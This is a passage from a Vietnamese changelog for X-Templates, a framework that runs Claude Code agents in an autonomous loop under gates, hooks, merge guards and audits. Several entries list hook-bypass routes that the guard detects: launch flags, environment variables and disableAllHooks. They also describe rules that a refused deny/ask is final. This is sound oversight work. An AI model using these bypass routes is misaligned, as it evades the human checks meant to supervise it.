- **Cổng không xanh khi không kiểm gì** (ADR-0011). Khi autopilot đang chạy (`.autopilot/state.json` `"active": true`),
  `dev-task.sh` coi `lint`/`test` rỗng hoặc no-op (`true`, `:`, `exit 0`, `echo …`, `printf …`) là ĐỎ (exit 3); ngoài
  vòng giữ fail-open. `xt.py loop init` cảnh báo `Cổng sẽ ĐỎ trong vòng` khi `xt.yaml` để hai khoá đó rỗng/no-op (không
  chặn). Mục checklist: `LOOP-HARNESS-008` thêm câu về ADR-0011 và *Kiểm* `loop init` không in cảnh báo (ID, mức giữ).
  Mẫu `templates/xt.yaml` ghi luật mới. Dự án đích: chạy lại `install.py` để nhận `dev-task.sh` mới.
- **Blueprint gọn theo quy mô** (ADR-0012). `compose --out F` ghi `F` chỉ chứa MUST hiệu lực ở quy mô + `F-BACKLOG.md`
  chứa SHOULD/MAY (frontmatter `backlog:`); web-app + ecommerce: 41 KB ở S, 229 KB ở M, 483 KB ở L thay vì ~690 KB.
  Ghép lại giữ trạng thái theo ID qua cả hai file (kể cả từ bản một file cũ, kể cả khi đổi quy mô). `blueprint-status`,
  verdict và `audit plan` đọc cả backlog; khai backlog mà mất file → `--strict` đỏ. `--full` giữ một file như cũ. Trần
  vòng `loop init --single-session` đổi thành `max(20, 4 × task chưa làm)` (bỏ cộng MUST mở — đã gom vào task; thay
  công thức ở ADR-0009). Dự án đích: ghép lại `compose ... --out BLUEPRINT.md` rồi commit cả hai file.
- CI: workflow `portability.yml` (job `macos-bash32`, bash 3.2/BSD) bỏ trigger `pull_request`, chỉ chạy khi push vào `main` —
  PR không còn chờ runner macOS; job không phải required check nên ruleset không đổi. (Sau đó gỡ hẳn — xem `### Removed`.)
- **Autopilot chạy một phiên đến khi xong** (ADR-0009). Context đầy → compaction có checkpoint, không bàn giao; bàn giao
  chỉ khi ≥ 80% trần vòng/giờ/tiền. Việc cần người không chặn cả vòng (`loop defer`), gom cuối phiên. Mục checklist:
  `LOOP-CTX-003` → `MAY` Ngừng dùng, thay bằng **`LOOP-CTX-017`** (MUST, mới); `LOOP-CTX-008` → `MAY`, thay bằng
  **`LOOP-CTX-018`** (SHOULD); `LOOP-CTX-012` → `MAY`, thay bằng **`LOOP-CTX-019`** (SHOULD: vượt ngân sách thì thu hẹp phạm vi
  bằng `D-NNN`, không chia phiên); mới **`LOOP-CTX-020`** (SHOULD, chế độ quyền không hỏi), **`LOOP-STOP-021`** (SHOULD,
  `loop defer`); `LOOP-CTX-009` nơi ghi checkpoint đổi từ PROGRESS sang `.autopilot/state.json` + thêm *Kiểm* (ID, mức giữ).
  `loop status` khi vòng đã kết thúc báo verdict cuối thay vì "chưa bật". Skill `/autopilot` có bước 0 (chế độ quyền, hook);
  `AGENTS.md`, mẫu `AGENTS.md`/`CLAUDE.md`/`PLAN.md`, giao thức `11-autonomous-loop/README.md`, skill `/handover` theo luật mới.
  Dự án đích: chạy lại `install.py` (`merge_hooks` thêm `PreCompact`; AGENTS.md/skill copy-if-absent → gộp tay `*.xtemplates-new`).
- **Phiên chính tự duyệt điểm quyết định theo tiêu chí chất lượng cuối; mặc định tự host** (ADR-0008, repo khung + dự án
  đích). Tách *điểm quyết định chuyên môn* (duyệt PLAN, spec hở/nhiều cách hiểu/mâu thuẫn, chọn công nghệ/thiết kế, bảo
  mật/pháp lý mơ hồ) khỏi *điểm dừng về hành động* (giữ nguyên, thêm đăng ký dịch vụ trả phí/nhập khoá thật). Tiêu chí theo
  thứ tự: đúng & an toàn · giữ đường lùi · bền lâu · trải nghiệm cuối · tốc độ/chi phí chỉ phá hoà. Phương án cần tài
  khoản/khoá/thông tin chỉ chủ dự án có → tự host, đề xuất dịch vụ khi chạy thật ghi `--prod`, quyết ở G7. Mục checklist:
  `LOOP-STOP-004` → `MAY` Ngừng dùng, thay bằng **`LOOP-STOP-018`** (MUST@L, mới); `PM-SPEC-007` → `MAY` Ngừng dùng, thay
  bằng **`PM-SPEC-020`** (MUST, mới: spec hở → câu hỏi mở + `D-NNN`, không lấp ngầm); `WF-SDD-004` → `MAY` gộp vào
  `PM-SPEC-020`; `PM-REQ-008` → `MAY` Ngừng dùng, thay bằng **`PM-REQ-019`** (MUST, mới); mới **`LOOP-STOP-019`** (SHOULD,
  báo cáo liệt kê D-NNN), **`LOOP-STOP-020`** (SHOULD, mặc định tự host); `PM-REQ-013` chấp nhận `D-NNN` thay chữ ký người
  (ID, mức giữ). `AGENTS.md` repo khung: §4 mới (điểm quyết định), §5 điểm dừng về hành động, các mục sau +1; mẫu
  `templates/AGENTS.md` §5–6 tương tự; `templates/GO-NO-GO.md` mục 18 BLOCKER: mọi đề xuất "Khi chạy thật" đã được chủ dự án
  quyết; `templates/PLAN.md`/`SPEC.md`/`PROJECT.md`, skill `/autopilot`, subagent `executor` theo luật mới. Dự án đích: chạy lại
  `install.py` (AGENTS.md/skill copy-if-absent → gộp tay bản `*.xtemplates-new`) và `compose --out BLUEPRINT.md`.
- CI: trigger `pull_request` thêm loại `edited` (cùng `opened`, `synchronize`, `reopened`) để sửa tiêu đề PR là chạy lại bước kiểm tiêu đề Conventional Commits ≤ 72 ký tự. Trước đây payload chụp tiêu đề lúc push và re-run dùng lại payload cũ, nên tiêu đề đã sửa vẫn đỏ cho tới commit kế tiếp.
- **Phá vỡ (bản kế tiếp 3.0.0)** — định danh kỹ thuật theo tên X-Templates, thay ADR-0006 bằng ADR-0007:
  `.xstored/` → `.xtemplates/`, `scripts/xs.py` → `scripts/xt.py`, `xs.yaml` → `xt.yaml`, `XS_*` → `XT_*`
  (`XT_ROOT`, `XT_DEBUG`, `XT_FRAMEWORK`, `XT_FRAMEWORK_LINK`, `XT_PROGRESS_BASE`, `XT_RECORD_TIMEOUT`),
  `*.xstored-new` → `*.xtemplates-new`; test `tests/test_xs*.py` → `tests/test_xt*.py`. Dự án đã cài: chạy lại `install.py`
  từ bản mới — tự chép manifest hash, xoá `.xstored/`, đổi `xs.yaml` → `xt.yaml`, liệt kê file người dùng còn nhắc tên cũ
  (`*.md` gốc, `.claude/`, `.github/workflows/`) để sửa tay. Phần *Kiểm* của các mục nhắc `xs.py`/`.xstored` đổi theo
  (ID, mức giữ nguyên). Tài liệu lịch sử (`research/`, báo cáo audit đã ký, ADR-0001…0006, mục CHANGELOG cũ) giữ tên cũ.
- Đổi tên repo `seeker19110/X-stored` → `seeker19110/X-Templates` (GitHub chuyển hướng 301 từ tên cũ): cập nhật tên khung,
  URL clone trong README + bước CI chạy lệnh README, docstring/`--help` của `install.py`/`xs.py`, harness `.claude/`, mẫu dự án đích.
  Giữ nguyên để không phá dự án đã cài: thư mục `.xstored/`, `xs.py`, `xs.yaml`, biến `XS_*`, đuôi `.xstored-new`; giữ tên cũ
  ở tài liệu lịch sử (`research/`, báo cáo audit đã ký, trích dẫn "khung cũ X-stored") — ADR-0006.
- `LOOP-HARNESS-012` → `MAY` Ngừng dùng, thay bằng **`LOOP-HARNESS-018`** (SHOULD, mới): hook **không** có biến môi trường
  tắt riêng (agent tự đặt được = nới hàng rào ADR-0002); tắt có chủ đích qua `disableAllHooks` của Claude Code. Dự án đích
  ghép lại blueprint: bỏ trạng thái của 012, đánh giá 018 mới. Test `HookFailOpenTest`: 5 hook × stdin rỗng/rác (dự án tạm có
  `xs.py`) → exit 0, không ra quyết định; không hook nào chứa `DISABLE`/`SKIP_HOOK`; mọi hook trong `settings.json` được phủ.
- Quy mô M: mỗi module/chuẩn tối đa 4 MUST hiệu lực, `xs.py validate` chặn khi vượt (ADR-0004). 671 mục `MUST`/`MUST@M` của
  `kind: module`/`standard` → `MUST@L` (ID, nội dung giữ nguyên; xem từng ID: `git diff 55de4d1 -- framework | grep '^+- \[ \].*MUST@L'`).
  Blueprint M: `web-app` 1.094 → 470 MUST, `api-service` 912 → 402, `cli-tool` 547 → 271; S và L không đổi.
  Dự án đích: chạy lại `compose --out BLUEPRINT.md` — trạng thái giữ theo ID.

### Added
- **Phân loại test đỏ, chọn tầng theo rủi ro, ba mặt cắt ngang** (`test-strategy.md`; nguồn: `seeker19110/stored` mục 09 §3).
  Mục mới (ID, mức): `QA-STRAT-021` SHOULD (test đỏ vào một trong bốn nguyên nhân: bug thật giữ test, kỳ vọng sai trích SPEC,
  bó vào cài đặt, flaky/môi trường), `QA-STRAT-022` SHOULD (tầng test theo rủi ro thay đổi), `QA-STRAT-023` SHOULD (vùng
  `critical`: người viết test độc lập ngữ cảnh với người viết code, test viết từ SPEC). `LOOP-CI` bảng loại lỗi trỏ tới
  `QA-STRAT-021`. Không thêm agent hoặc hook: bốn nguyên nhân khớp hook `pre-edit-guard.sh` hiện có và vai độc lập dùng
  lại `executor` ngữ cảnh khác. Dự án đích: ghép lại blueprint để nhận ID mới.
- **Mục nhóm C từ đợt rà `seeker19110/stored` (2026-10-16)** — 19 mục mới (kèm một module mới), mọi mục có *Kiểm* và nguồn
  stored. Dự án đích: ghép lại blueprint để nhận các ID mới.
  - Bảo mật/bí mật: `SEC-WEB-027` (MUST@L, xuất CSV/XLSX vô hiệu công thức), `SEC-SECRET-022` (secret tích hợp write-only,
    đổi đích thì bỏ secret), `BE-AUTH-025` (MUST@L, nhận lời mời chỉ sau khi xác minh email bằng token; xem *Ghi chú mức* dưới).
  - Quy trình/kiểm thử/khung: `WF-REVIEW-020` ("Rà cùng khuôn" trong PR `fix:`), `QA-INT-020` (chạy bộ test chuẩn chính thức,
    `known-gaps.txt` chỉ giảm), `LOOP-FB-005` (bảng "đích × bản khung × số tuần chậm" trong REPORT; không đổi `xt.py`).
  - AI: `AI-OBS-018` (SHOULD, MUST@L khi có dữ liệu cá nhân: `docs/ai/data-flows.md` + job egress deny-all),
    `AI-AGENT-021` (MUST@L, xoá memory lan tới dữ liệu phái sinh), `AI-AGENT-022` (bank memory phân vùng, đo p95 recall),
    `IND-SAAS-024` (trạng thái AI thích nghi khoá theo tenant), `CMP-LIC-020` (license model theo model card + revision).
  - Tài liệu/profile/UX: `XC-DOCAI-020` (`DESIGN.md` theo spec, token sinh từ nguồn gốc), `PRF-LIB-020` (hướng dẫn cho agent
    của bên dùng nằm trong tarball), `UX-A11Y-028` (tương phản theo trạng thái hover/focus/active/selected),
    `BASE-DOC-017` (số công bố khớp file kết quả), `BASE-DOC-018` (`docs/limitations.md`).
  - Module mới `06-design-ux/data-visualization.md` (prefix `UX-VIZ`): `UX-VIZ-001` (MUST@L, số từ một hàm dữ liệu có test +
    fixture "trông hợp lý nhưng sai"), `UX-VIZ-002` (MUST, bảng/mô tả thay thế, không chỉ màu, ≥ 3:1), `UX-VIZ-003`
    (SHOULD, trục từ 0, `vi-VN`, tiền số nguyên); README mảng 06 thêm dòng và prefix.
  - Ghi chú mức: `BE-AUTH-025` yêu cầu ban đầu là MUST nhưng `authn-authz.md` đã đủ 4 MUST hiệu lực ở quy mô M (ADR-0004,
    `xt.py validate` chặn), nên đặt MUST@L; `AI-OBS-018` ghi mức MUST@L khi có dữ liệu cá nhân trong câu yêu cầu (cột mức
    máy đọc là SHOULD).
- **Mục nhóm B từ rà kho `stored` 2026-10-16** (11 ID mới, không đổi ID/mức cũ): `SEC-AI-027` MUST@L (text-to-SQL: vai
  trò CSDL chỉ đọc chịu RLS + AST allowlist trước DB) · `WF-CI-023` MUST@L (workflow `pull_request` không chạm secret
  ngoài `GITHUB_TOKEN` trừ job có `environment:`) · `AI-EVAL-018` MUST@L (n, runs, CI 95%, ngưỡng cổng > nhiễu đo) ·
  `AI-EVAL-019` SHOULD (eval bộ phân loại/định tuyến theo từng tác vụ: accuracy, đổi đáp án khi đảo thứ tự, ECE,
  coverage@risk; trần leo thang) · `AI-RAG-019` MUST@L (kiểm trích dẫn tất định ở server) · `DB-SEARCH-020` MUST@L
  (bảng mặc định ngôn ngữ của mọi thành phần tìm kiếm/RAG/memory; `preprocess_version`) · `UX-DS-019` MUST@L (dùng
  component design system; lint chặn primitive/thẻ gốc ngoài `components/ui/**`) · `QA-STATIC-021` SHOULD (fixture xấu/
  tốt cho luật tự viết) · `LOOP-DESIGN-021` SHOULD (task UI do agent: ảnh chụp theo SHA, kỳ vọng + falsifier,
  `measured`/`unmeasured`) · `LOOP-HARNESS-022` SHOULD (sandbox OS/egress allowlist cho phiên không người trực; tên
  khoá settings sandbox của Claude Code: chưa xác minh) · `LOOP-STOP-025` MUST@L (`deny`/`ask` bị từ chối là kết luận,
  không lách). `WF-CI-023` và `LOOP-STOP-025` đặt MUST@L (không phải MUST@M/MUST) vì module đã đủ 4 MUST ở quy mô M
  (ADR-0004; `xt.py validate` chặn). `AGENTS.md` gốc và `framework/templates/AGENTS.md` thêm một gạch luật bất biến
  "Bị chặn là kết luận". `xt.py ci-check` thêm luật `WF-CI-023` (job không `environment:` trong workflow có
  `pull_request`/`pull_request_target` chứa `secrets.X` ≠ `GITHUB_TOKEN`, `secrets[...]`, `toJSON(secrets)` hoặc
  `secrets: inherit` → lỗi; ngoại lệ `# ci-check-allow: <lý do>`); workflow `secret-scan.yml` của khung khai ngoại lệ cho
  khoá giấy phép quét. Dự án đích: ghép lại blueprint để nhận mục mới; chạy lại `install.py` để nhận `xt.py` mới, rồi
  `xt.py ci-check` — workflow nào đưa secret vào job `pull_request` sẽ đỏ.
- **PR theo lát + máy tự merge** (ADR-0014, D-010; chủ repo yêu cầu 2026-10-16). Mục mới `LOOP-DESIGN-020` (SHOULD): mỗi
  lát dọc chạy được là một nhánh + một PR nhỏ, mở ngay khi Gate của lát xanh (bỏ "PR cuối"); lát phụ thuộc PR chưa merge
  thì chồng nhánh, merge theo FIFO; PR đã mở được `merge-check` quyết mỗi vòng. Guard thêm hai đường merge ghim head
  cho phiên chặn GraphQL: `gh api -X PUT repos/{owner}/{repo}/pulls/N/merge -f sha=<head> [-f merge_method=…]` và tool
  MCP `merge_pull_request` có `expectedHeadSha` (owner/repo phải trùng `repo` mà `merge-check` trả — trường mới) →
  `allow` khi verdict `merge`; bật auto-merge của GitHub (`enable_pr_auto_merge`, `--auto`) luôn hỏi vì không ghim được
  head. `merge-check` trả thêm `repo`, `next_rest` (merge REST ghim head) và `wait` cho PR chồng nhắm nhánh khác nhánh
  mặc định (`baseRefName`/`defaultBranch` từ REST); `update` gợi ý `git merge origin/<đích>` (không cần GraphQL). Allow
  MCP chỉ cho server `mcp__github__`. `LOOP-STOP-022`, `LOOP-STOP-002` (*Kiểm*; ID, mức giữ) ghi ba đường merge; giao thức autopilot (README mảng 11 bước 11, 15; skill
  `/autopilot` bước 10, 13) theo PR từng lát; bảng lệnh mảng 11 thêm `merge-check`. Repo khung bật `merge_autonomy: L2`;
  mẫu dự án đích giữ L1. Dự án đích: chạy lại `install.py` (guard, `pre-mcp-guard.sh` mới) và ghép lại blueprint.
- `LOOP-DESIGN-019` **SHOULD** (mới): vòng bảo trì G8 → task mới kích hoạt bằng ngưỡng tất định (script so chỉ số với
  baseline), quyền agent theo bậc lệch (1σ log · 2σ chẩn đoán read-only · 3σ chỉ mở PR/issue hoặc runbook đã duyệt),
  không bậc nào merge/deploy; thêm dòng "Trigger theo ngưỡng" vào bảng chọn tầng và một bẫy trong `loop-design.md`.
  Nguồn: playbook AI-native SDLC của Anthropic (2026-08-21) stage 6, qua catalog `seeker19110/stored` 21 §10c.
- `xt.py doctor` thêm kiểm `memory` (mức `warn`, không tự sửa) cho `LOOP-HARNESS-021`: cảnh báo khi bật > 1 công cụ memory ngoài (engram, claude-mem, agentmemory, mem0, openmemory, basic-memory; khớp theo token trong tên) qua `enabledPlugins` ở `~/.claude/settings.json` → `.claude/settings.json` → `.claude/settings.local.json` (cấp sau thắng) và MCP server ở `~/.claude.json` (gốc và `projects.<dự án>`) + `.mcp.json`; theo `CLAUDE_CONFIG_DIR`; và khi `.engram/` nằm trong git. Chỉ đọc tên, không in giá trị cấu hình; không xác định được home thì bỏ phần cấp người dùng (fail-open, không làm vỡ `loop init`). Vì sao đọc cả cấp người dùng: `engram setup claude-code` đăng ký MCP vào `~/.claude.json` (D-008). Phần *Kiểm* của `LOOP-HARNESS-021` trỏ lệnh này (ID, mức giữ).
- `11-autonomous-loop/harness-files.md`, bảng "Context vs memory vs tài liệu": thêm dòng **Memory tra cứu (tuỳ chọn)** và quyết định "một hay nhiều công cụ memory ngoài": **tối đa một**, nguồn sự thật vẫn là file harness; đề xuất mặc định engram (agent ghi có chủ đích, khớp `AI-AGENT-009`/`PRF-AGENT-013`), claude-mem khi muốn ghi tự động, agentmemory khi chấp nhận engine ELv2. Không đổi ID/mức.
- `LOOP-HARNESS-021` **SHOULD** (mới) từ catalog `seeker19110/stored` 10 §4c (engram), bổ sung cho `LOOP-HARNESS-019`: chỉ bật một công cụ memory ngoài; kho memory ngoài repo, quyền chỉ chủ, coi là nhạy cảm vì có công cụ lưu nguyên văn prompt; đồng bộ memory vào repo (`.engram/`) tắt ở repo công khai, repo riêng phải quét bí mật. Dự án đích: chạy lại `compose`.
- **Máy quyết khi nào merge PR đã mở** (ADR-0013). `xt.py merge-check [--pr N] [--pr-json F] [--json]` đọc PR (bản đầu
  qua `gh pr view`; nay qua REST — mục `merge-check` ở trên)
  và trả `merge` · `wait` (nháp, CI đang chạy, mergeable chưa tính) · `update` (tụt sau nhánh đích → `gh pr update-branch`)
  · `fix` (xung đột, CI đỏ, reviewer đòi sửa) · `human` (làn chuẩn, không có CI, ruleset đòi review, mức tự chủ < L2) ·
  `closed`; exit 0 chỉ khi `merge`. Vị từ làn nhanh của `LOOP-STOP-009` thành mã: không đường dẫn nhạy cảm (bí mật, auth,
  thanh toán, mật mã, schema, cổng/CI, phụ thuộc + `merge_risk_paths`), không nhãn `risk:`, ≤ 150 dòng (không tính tài
  liệu/lockfile), ≤ 1 gói, đổi mã thì có đổi test. Guard: `gh pr merge` vẫn hỏi người, chỉ `allow` khi lệnh đứng một mình,
  ghim `--match-head-commit` đúng head đã kiểm, không `--admin`/`--repo`, và `merge-check` = `merge`. `xt.yaml` thêm
  `merge_autonomy` (mặc định `L1` = người merge mọi PR) và `merge_risk_paths`. `.claude/settings.json` bỏ `Bash(gh pr merge *)`
  khỏi `permissions.ask` (luật ask luôn hỏi kể cả khi hook `allow`); `doctor` cảnh báo khi L2 mà dự án còn dòng đó. Mục
  checklist: mới **`LOOP-STOP-022`** (SHOULD); `LOOP-STOP-002` thêm ngoại lệ merge làn nhanh và đổi *Kiểm*; `LOOP-STOP-009`
  *Kiểm* trỏ `merge-check` (ID, mức giữ). Dự án đích: chạy lại `install.py`; muốn tự merge thì người đặt
  `merge_autonomy: L2` và xoá `Bash(gh pr merge *)` khỏi `permissions.ask`.
- **Audit khung trước `/autopilot`**: `xt.py doctor [--fix] [--json]` kiểm khung đã cài trong dự án (hoặc repo khung) —
  Python ≥ 3.11/git/bash, hook bắt buộc trong `.claude/settings.json` (SessionStart · PreCompact · PreToolUse · Stop; thiếu
  PostToolUse chỉ cảnh báo), file hook và file chúng nạp (`_lib.sh`, `guard.py`) tồn tại + đúng cú pháp (`bash -n`/`compile`),
  skill/subagent, `*.xtemplates-new` chưa gộp, `AGENTS.md`/`CLAUDE.md` (`@AGENTS.md` ngoài code block), `xt.yaml` đủ 4 khoá và
  cảnh báo cổng no-op khi để trống, `.autopilot/` trong `.gitignore`, `.autopilot/state.json` hỏng/BLOCKED/trỏ PLAN mất, tên cũ
  `.xstored/`/`xs.yaml`, repo git, khung `validate` xanh, `progress-check`. `--fix` chỉ sửa phần an toàn, đảo ngược được (tạo file
  thiếu từ mẫu khung không đè, thêm dòng `@AGENTS.md`/`.autopilot/`, đổi `xs.yaml` → `xt.yaml`, chuyển state hỏng sang
  `state.json.hong-<giờ>`); hook/settings không tự sửa (điểm dừng) — báo người chạy lại `install.py`. Exit 1 khi còn lỗi ✗.
  Skill `/autopilot` bước 0 chạy `doctor --fix` đầu tiên; `loop init` chạy phần nhanh và cảnh báo trên stderr khi còn lỗi (không
  chặn). Mục mới **`LOOP-HARNESS-020`** (SHOULD). Giao thức `11-autonomous-loop/README.md` thêm Pha 0; `AGENTS.md`, mẫu
  `AGENTS.md`, skill `/audit` (nhóm 13 dùng `doctor --json`), lời nhắc cuối `install.py` theo đó.
- **Phản hồi từ dự án đích về khung** (ADR-0010): `xt.py feedback add` (lỗi do khung + cách khắc phục → `docs/xtemplates-feedback/FB-NNN.md`,
  gộp một dòng, `redact`, kèm phiên bản khung), `feedback collect` (tự gom MUST bị miễn và lý do autopilot `blocked`, không trùng),
  `feedback list`, `feedback aggregate --from <dự-án>=<thư-mục>` (repo khung gộp theo (loại, ID); đủ ngưỡng khi ≥ 2 dự án hoặc có tái hiện).
  Module mới `framework/11-autonomous-loop/framework-feedback.md` — **`LOOP-FB-001`** (SHOULD), **`LOOP-FB-002`** (SHOULD),
  **`LOOP-FB-003`** (MUST: không bí mật/dữ liệu/mã dự án), **`LOOP-FB-004`** (SHOULD). `docs/ops/TARGETS.md` (danh sách dự án kéo
  phản hồi), issue template `.github/ISSUE_TEMPLATE/feedback-du-an-dich.yml`; `AGENTS.md` mẫu, `/autopilot`, `/handover` gọi
  `feedback collect`. README liệt kê đủ lệnh `loop` (`defer`/`decide`/`checkpoint`). Dự án đích: chạy lại `install.py` + `compose`.
- `loop decide`: `--choice` ưu tiên khớp nguyên văn (phương án là số), số thứ tự chỉ nhận chữ số ASCII; `--log` phải là
  file trong dự án. `loop checkpoint`: tên file giữ Unicode (`core.quotePath=false`), thiếu git không mất checkpoint,
  repo chưa commit không ghi `HEAD`; bằng chứng mới nhất hỏng thì lùi về file trước, gồm cả ID blueprint. `loop status`
  ẩn checkpoint cũ hơn bằng chứng mới nhất; `loop stop` ghi verdict cuối `stopped` (review độc lập trước merge).
- Hook **`PreCompact`** (`.claude/hooks/pre-compact.sh`) → `xt.py loop checkpoint`: trước khi nén ghi task đang làm, lệnh kiểm
  cuối + exit code, file chưa commit, lỗi lặp vào `.autopilot/state.json`; luôn exit 0 (exit 2 sẽ chặn nén); SessionStart sau
  nén in lại qua `loop status`. `HookFailOpenTest` phủ 6 hook.
- `xt.py loop defer --task <T-NNN|ID blueprint> --reason R` + verdict **`done-pending-human`** (Stop hook cho dừng, liệt kê
  việc chờ); `loop resume` đưa việc chờ lại hàng làm. `loop init --single-session` (trần vòng `max(20, 4 × (task chưa làm + MUST mở
  của blueprint))` khi không khai `--max-iterations`). `defer` từ chối lý do rỗng, ID không còn mở, task đang lỗi. `loop hook-stop` ghi `permission_mode` từ stdin và cảnh báo khi `default`/`plan`/`acceptEdits`.
- `xt.py loop decide --question Q --option A --option B [--option …] --choice N|văn bản --why W --revert R [--prod P] [--log F]`:
  ghi quyết định tự duyệt `D-NNN` (tăng dần theo số lớn nhất trong file) vào `docs/autopilot/DECISIONS.md`; exit 2 khi < 2
  phương án khác nhau, lựa chọn không khớp, hoặc câu hỏi/lý do/đường lùi rỗng; mỗi trường gộp một dòng; không đổi state autopilot.
- `XC-DOCAI-019` **SHOULD** (mới) từ catalog `seeker19110/stored` 20 §3h: khi cấp skill cho agent **theo stack**, ưu tiên installer dò stack có **cổng xuất xứ** (manifest + SHA-256 từng file + review nội dung + cảnh báo trước khi cài + `skills-lock.json`) hơn chép tay hoặc marketplace tự cập nhật; mẫu tham chiếu `autoskills` (midudev). License của nó là **CC BY-NC 4.0** (phi thương mại) nên chỉ gọi CLI đã xuất bản như bước dev tuỳ chọn, **không** đưa vào `dependencies`/bước build phân phối và **không** vendor registry/mã (CMP-LIC cấm CC BY-NC mặc định). Dự án đích: chạy lại `compose`.
- 8 mục **SHOULD** mới từ catalog `seeker19110/stored` cập nhật 13–15/10: `SEC-SUPPLY-025` (đánh giá trên repo gốc, không mirror),
  `SEC-SUPPLY-026` (số commit/sao không phải bằng chứng bảo trì; loại tool dual-use đã bị lạm dụng), `CMP-LIC-019` (đổi license
  không CLA/DCO là rủi ro), `WF-REVIEW-019` (mục "Hỗ trợ AI" trong PR template), `AI-AGENT-019` (mức tin cậy theo người gửi
  kiểm bằng code trước tool call), `AI-AGENT-020` (memory CoALA; procedural memory đổi qua PR), `LOOP-HARNESS-019` (memory
  ngoài chỉ tra cứu), `XC-DOCAI-018` (không chồng pack chỉnh giọng). Phần *Kiểm* của `BE-FILE-011` thêm `tarfile` `filter="data"`
  (ID, mức giữ). Đính chính trong `research/…stored-catalog-extraction.md`: `ponytail` là repo thật. Dự án đích: chạy lại `compose`.
- `xs.py changelog-check [FILE]`: Keep a Changelog 1.1.0 (`[Unreleased]` đầu tiên, bản có ngày ISO 8601 giảm dần, nhóm chuẩn,
  ngày hợp lệ và giảm dần, không trùng nhóm trong Unreleased, bỏ qua code block, cho `[YANKED]`, bản mới nhất == `VERSION`);
  chạy trong cổng `lint` (BASE-REPO-007, AUD-DOC-020).
- Guard Bash hỏi người khi lệnh mở phiên Claude Code bỏ qua hook của dự án: `claude` hoặc gói `@anthropic-ai/claude-code`
  (npx, `npm exec`, `pnpm`/`yarn dlx`, `node …/cli.js`) với `--bare`, `--safe-mode`, `--settings`, `--setting-sources`,
  `--restricted`; gán `CLAUDE_CODE_SIMPLE`/`CLAUDE_CODE_SAFE_MODE`; `disableAllHooks` trong tham số claude hoặc lệnh ghi file.
  Nhắc tên như dữ liệu (`grep`, `git commit -m`) không hỏi. Giới hạn: `sh -c`/`eval`/alias/biến chứa cờ (phân tích tĩnh).
  Phần *Kiểm* của `LOOP-HARNESS-018` thêm điều này (ID, mức giữ).
- Workflow `release-tag.yml` (chạy tay trên `main`): tạo annotated tag `v<VERSION>` khi `CHANGELOG.md` có mục tương ứng
  và tag chưa tồn tại — đường phát hành không cần push tag từ máy (`BASE-REPO-006`).
- Audit có máy đỡ (ADR-0005): phương pháp `framework/00-method/audit.md` (13 nhóm, thêm *Harness & quy trình agent*;
  mức 🔴/🟠/🟢; bằng chứng đo được/suy luận/chưa biết; xác minh đối kháng; quét lại theo diff; Definition of Complete),
  mẫu `templates/AUDIT-STATUS.md` (sổ máy đọc) + `templates/AUDIT-REPORT.md`, skill `/audit` viết lại.
- `xs.py audit plan [--blueprint] [--status] [--json]`: tín hiệu repo → nhóm áp dụng/rút gọn/N/A, công cụ có/thiếu,
  mục blueprint có bằng chứng/miễn trừ trỏ file đã đổi sau khi ghi, nhóm cần quét lại theo SHA trong sổ.
- `xs.py audit check STATUS [--strict]`: schema sổ audit, SHA quét là tổ tiên HEAD, chấp nhận rủi ro có chủ + hạn chưa quá.
- `xs.py progress-check [FILE]`: `PROGRESS.md` ≤ 8192 byte, đúng 4 mục theo thứ tự, mọi SHA ở Bàn giao phiên là tổ tiên HEAD
  và đã có trên nhánh chính (`XS_PROGRESS_BASE`, mặc định `origin/main`) — chặn SHA của nhánh PR mà squash-merge sẽ xoá;
  clone nông → báo cần `fetch-depth: 0`. Thay các lệnh rời `wc -c`/`git merge-base` trong phần Kiểm của `LOOP-HARNESS-004/005`,
  `WF-DOC-004`, `BASE-DOC-008`, `QA-STATIC-018`, `PM-PLAN-009` (ID và mức giữ nguyên).
- `xs.py ci-check [DIR]`: fitness function cho workflow CI (`WF-CI-020`) — `permissions:` cấp workflow, không `write-all`,
  `uses:` ghim SHA 40 ký tự (`docker://` ghim `@sha256:`), job có `timeout-minutes`, không `continue-on-error`; ngoại lệ ghi `# ci-check-allow: <lý do>`.
- Cổng `lint` của repo chạy hai lệnh trên; job `quality` checkout `fetch-depth: 0`.
- Repo khung trả nợ AUD-CODE-001: 11 hàm vượt độ phức tạp vòng 10 (`validate` 37, `audit_check` 31, `install` 21…)
  tách theo trách nhiệm, hành vi không đổi (so output/exit code 64 lệnh trước–sau); `ruff.toml` bật C901
  (`max-complexity = 10`) nên cổng `lint` chặn hàm mới vượt ngưỡng.
- Repo khung trả nợ AUD-CODE-002 và AUD-TEST-001: cổng `typecheck` chạy `mypy --strict` (0 lỗi); cổng `test` đo coverage
  dòng + nhánh tính cả code chạy trong subprocess (`.coveragerc`: `patch = subprocess`) và chặn dưới 100%
  (`coverage report --fail-under=100` — ratchet `BASE-GATE-013`); `coverage` 7.16.2 (Apache-2.0) khoá kèm hash.
- CI repo: `concurrency` chỉ hủy run cũ của PR, không hủy run trên `main` (`WF-CI-008`).

### Removed
- **Workflow `portability.yml` (job `macos-bash32`)** — chủ repo yêu cầu gỡ macOS khỏi CI (2026-10-17). CI repo khung chỉ
  còn chạy Ubuntu: không còn máy kiểm bash 3.2, sed/awk BSD hay `python3` 3.9 hệ thống của macOS cho hook/installer;
  AUD-CI-008 (job chỉ chạy sau merge) không còn áp dụng.

### Fixed
- **Ba nợ 🟢 từ review #110**: `xt.py pr reviewed --pr` chỉ nhận số PR, `#N` hoặc URL `…/pull/N[/files][#…]` — dạng khác
  exit 2 thay vì ghi khoá rác vào `.autopilot/reviews.json`; `xt.py … | head` (bên đọc đóng ống) im lặng, exit 141 như
  lệnh Unix thay vì in `✗ [Errno 32] Broken pipe`; danh sách hành động của `pr next` ở `LOOP-STOP-022` (SHOULD, không đổi
  mức) thêm `merge` (dưới L3) và `closed` cho khớp ADR-0025.
- `xt.py feedback aggregate`: phản hồi có ID cục bộ của dự án (`T-003`, `loop`, mọi `bi-chan`) gộp theo triệu chứng
  chuẩn hoá thay vì theo ID — hai dự án khác lý do không còn bị tính "đủ ngưỡng"; bảng in mọi triệu chứng khác nhau
  thay vì chỉ cái đầu (AUD-CODE-004).
- `xt.py doctor` cảnh báo `gate-tools` khi lệnh cổng trong `xt.yaml` gọi công cụ/mô-đun không có trên máy (vd
  `shellcheck`, `python3 -m mypy`) — trước chỉ biết khi cổng đỏ (AUD-HAR-034). `feedback collect` bỏ qua trong repo khung
  (phản hồi tự gom dành cho dự án đích, AUD-HAR-048). `loop status` hết hạn đúng lúc tới hạn chót (`--hours 0` trước vẫn
